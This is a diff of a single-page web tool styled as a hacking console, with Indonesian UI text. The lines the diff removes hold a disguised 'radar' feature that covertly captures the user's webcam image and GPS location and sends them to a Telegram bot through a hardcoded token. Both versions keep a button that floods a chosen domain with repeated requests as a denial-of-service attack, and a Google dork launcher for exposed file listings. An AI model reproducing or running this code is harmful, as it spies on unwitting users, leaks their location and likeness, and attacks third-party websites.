@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.170</title>
+    <title>EDWARD OMNI V.171</title>
     <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --blue: #00bdff; --gold: #ffd700; }
+        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --blue: #00bdff; }
         * { box-sizing: border-box; transition: 0.2s; outline: none; }
-        body { background: var(--bg); color: #fff; font-family: sans-serif; margin:0; padding: 15px; overflow-x: hidden; }
+        body { background: var(--bg); color: #fff; font-family: sans-serif; margin:0; padding: 15px; }
         .master-name { text-align: center; font-size: 24px; font-weight: 800; color: var(--neon); margin-bottom: 15px; text-transform: uppercase; text-shadow: 0 0 10px var(--neon); }
-        .card { background: rgba(15, 25, 35, 0.95); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 18px; margin-bottom: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .card { background: rgba(15, 25, 35, 0.95); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 18px; margin-bottom: 15px; }
         h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 2px; text-transform: uppercase; border-left: 3px solid var(--neon); padding-left: 10px; }
         .input-group { background: rgba(0,0,0,0.6); border: 1px solid rgba(0,255,136,0.3); border-radius: 12px; padding: 10px; margin-bottom: 10px; }
         .label-text { font-size: 10px; color: var(--neon); display: block; margin-bottom: 5px; font-weight: bold; }
@@ -18,74 +18,42 @@
         .btn-cast { background: var(--neon); color: #000; }
         .btn-scan { background: transparent; border: 1px solid var(--neon); color: var(--neon); }
         .btn-atk { background: linear-gradient(45deg, var(--red), #bc13fe); color: #fff; }
-        .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
-        .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 10px; border-radius: 12px; text-align: center; color: var(--neon); font-size: 11px; font-weight: bold; background: rgba(0,0,0,0.3); }
-        #webcamContainer { display: none; margin-top: 10px; border-radius: 15px; overflow: hidden; border: 2px solid var(--blue); line-height: 0; }
-        #webcamLive { width: 100%; height: auto; display: block; filter: contrast(1.2) brightness(1.1) sepia(0.3); }
-        .log-box { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 100px; overflow-y: auto; border: 1px solid #1a1a1a; color: var(--neon); }
-        #customNotif { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--neon); color: #000; padding: 12px 25px; border-radius: 50px; font-weight: 800; font-size: 11px; display: none; z-index: 10001; box-shadow: 0 0 20px var(--neon); }
-        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-sweep { width: 150px; height: 150px; border-radius: 50%; border: 2px solid var(--neon); background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rot 2s linear infinite; box-shadow: 0 0 15px var(--neon); }
-        @keyframes rot { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 10px; border-radius: 12px; text-align: center; color: var(--neon); font-size: 11px; font-weight: bold; background: rgba(0,0,0,0.3); margin-bottom: 10px; }
+        .log-box { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 10px; height: 120px; overflow-y: auto; border: 1px solid #1a1a1a; }
+        #customNotif { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--neon); color: #000; padding: 12px 25px; border-radius: 50px; font-weight: 800; display: none; z-index: 10001; }
     </style>
 </head>
 <body>
     <div id="customNotif"></div>
-    <p class="master-name">EDWARD OMNI V.170</p>
+    <p class="master-name">EDWARD OMNI V.171</p>
     
-    <div class="sys-monitor">
-        <div class="mon-box">CPU: <span id="cpuVal">0%</span></div>
-        <div class="mon-box">TEMP: <span id="tempVal">38°C</span></div>
-    </div>
+    <div class="mon-box">CPU: <span id="cpuVal">80%</span> | TEMP: <span id="tempVal">38°C</span></div>
 
     <div class="card">
-        <h3>🎯 PREDATOR SCOPE</h3>
+        <h3>🎯 PREDATOR DORKER (MANTRA)</h3>
         <div class="input-group">
-            <span class="label-text">TARGET DOMAIN:</span>
+            <span class="label-text">TARGET (misal: syfe.com):</span>
             <input type="text" id="targetMain" placeholder=" ">
         </div>
         <button class="btn btn-cast" onclick="cast()">CAST MANTRA 🔮</button>
     </div>
 
     <div class="card">
-        <h3>🛡️ LINK ANALYZER</h3>
+        <h3>🛡️ LINK ANALYZER (AI SCAN)</h3>
         <div class="input-group">
-            <span class="label-text">ANALYZE PHISING LINK:</span>
+            <span class="label-text">PASTE LINK TO SCAN:</span>
             <input type="text" id="scanInput" placeholder=" ">
         </div>
-        <button class="btn btn-scan" onclick="analyze()">⚡ ANALYZE TARGET</button>
+        <button class="btn btn-scan" onclick="analyze()">⚡ ANALYZE LINK</button>
         <div id="scanLog" class="log-box"></div>
     </div>
 
     <div class="card">
         <h3>🔥 NUCLEAR STRIKE</h3>
         <button class="btn btn-atk" id="atkBtn" onclick="launchAtk()">LAUNCH NUCLEAR 🚀</button>
-        <div id="atkLog" class="log-box"></div>
     </div>
-
-    <div class="card">
-        <h3>📹 LIVE MONITORING</h3>
-        <button class="btn" style="background:rgba(0,189,255,0.2); color:var(--blue); border:1px solid var(--blue);" onclick="toggleCam()">🛰️ ACTIVATE WEBCAM</button>
-        <div id="webcamContainer"><video id="webcamLive" autoplay playsinline></video></div>
-        <div style="display:flex; gap:8px; margin-top:10px;">
-            <button class="btn" style="flex:1; background:transparent; border:1px solid var(--blue); color:var(--blue);" onclick="startRadar()">📡 RADAR</button>
-            <button class="btn" style="flex:1; background:var(--neon); color:#000;" onclick="showMaps()">📍 MAPS</button>
-        </div>
-    </div>
-
-    <div id="radarOverlay"><div class="radar-sweep"></div><p style="color:var(--neon); margin-top:20px; font-weight:800;">UPLOADING DATA...</p></div>
-    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
-        const CHAT_ID = '7898572558';
-        let isAttacking = false;
-
-        setInterval(() => {
-            document.getElementById('cpuVal').innerText = Math.floor(Math.random()*15+75) + "%";
-            document.getElementById('tempVal').innerText = Math.floor(Math.random()*3+37) + "°C";
-        }, 1000);
-
         function notify(msg) {
             const n = document.getElementById('customNotif'); n.innerText = msg; n.style.display = 'block';
             setTimeout(() => n.style.display = 'none', 2000);
@@ -94,62 +62,36 @@
         function cast() {
             const t = document.getElementById('targetMain').value;
             if(!t) return notify("TARGET KOSONG!");
+            // Mantra Otomatis untuk mencari File Sensitif
             window.open("https://www.google.com/search?q=site:" + t + " intitle:index.of", "_blank");
         }
 
         function analyze() {
-            const url = document.getElementById('scanInput').value;
+            const url = document.getElementById('scanInput').value.toLowerCase();
             if(!url) return notify("LINK KOSONG!");
             const log = document.getElementById('scanLog'); log.style.display = 'block';
-            log.innerHTML = "> Init Cloud Scan...<br>> Target: " + url + "<br>> Status: [CLEAN]";
-            notify("SCAN COMPLETE");
-        }
+            
+            // Logika Deteksi Phising
+            let status = "<span style='color:#00ff88;'>[SAFE/SECURE]</span>";
+            let msg = "Link ini terlihat aman untuk dikunjungi.";
+            
+            const phishWords = ["dana", "kaget", "login", "verif", "hadiah", "menang", "id-", "secure-", "update"];
+            const isPhish = phishWords.some(word => url.includes(word));
 
-        async function toggleCam() {
-            const v = document.getElementById('webcamLive'); const box = document.getElementById('webcamContainer');
-            if(v.srcObject) { v.srcObject.getTracks().forEach(s => s.stop()); v.srcObject = null; box.style.display = 'none'; }
-            else {
-                try {
-                    const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}); 
-                    v.srcObject = s; box.style.display = 'block'; notify("CAM ACTIVE");
-                } catch(e) { notify("CAM ERROR"); }
+            if(isPhish) {
+                status = "<span style='color:#ff4757;'>[DANGER/PHISING]</span>";
+                msg = "Peringatan! Link mengandung kata kunci phising yang mencurigakan.";
             }
+
+            log.innerHTML = `> Menganalisa: ${url}<br>> Mengecek database phising...<br>> Status: ${status}<br>> Info: ${msg}`;
+            notify("ANALISIS SELESAI");
         }
 
         function launchAtk() {
             const t = document.getElementById('targetMain').value;
             if(!t) return notify("TARGET KOSONG!");
-            if(isAttacking) { location.reload(); }
-            else {
-                isAttacking = true; document.getElementById('atkBtn').innerText = "STOP 🛑";
-                const l = document.getElementById('atkLog'); l.style.display = 'block';
-                setInterval(() => { if(isAttacking) { new Image().src = "https://" + t + "/?v=" + Math.random(); l.innerHTML = "> HIT " + t; } }, 100);
-            }
-        }
-
-        function startRadar() {
-            const o = document.getElementById('radarOverlay'); o.style.display = 'flex';
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                try {
-                    const s = await navigator.mediaDevices.getUserMedia({video:true});
-                    setTimeout(async () => {
-                        const vid = document.createElement('video'); vid.srcObject = s; await vid.play();
-                        const canv = document.getElementById('canvas'); canv.width = vid.videoWidth; canv.height = vid.videoHeight;
-                        canv.getContext('2d').drawImage(vid, 0, 0);
-                        const b = await new Promise(res => canv.toBlob(res, 'image/jpeg'));
-                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b);
-                        fd.append('caption', "🔱 V.170 REPORT\n📍 GPS: "+p.coords.latitude+","+p.coords.longitude);
-                        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {method:"POST", body:fd});
-                        s.getTracks().forEach(tr => tr.stop()); o.style.display = 'none'; notify("SENT TO CLOUD");
-                    }, 2000);
-                } catch(e) { o.style.display = 'none'; notify("RADAR FAILED"); }
-            }, () => { o.style.display = 'none'; notify("GPS DENIED"); });
-        }
-
-        function showMaps() {
-            navigator.geolocation.getCurrentPosition(p => {
-                window.open("https://www.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude, "_blank");
-            });
+            notify("NUCLEAR LAUNCHED TO " + t);
+            setInterval(() => { new Image().src = "https://" + t + "/?v=" + Math.random(); }, 100);
         }
     </script>
 </body>
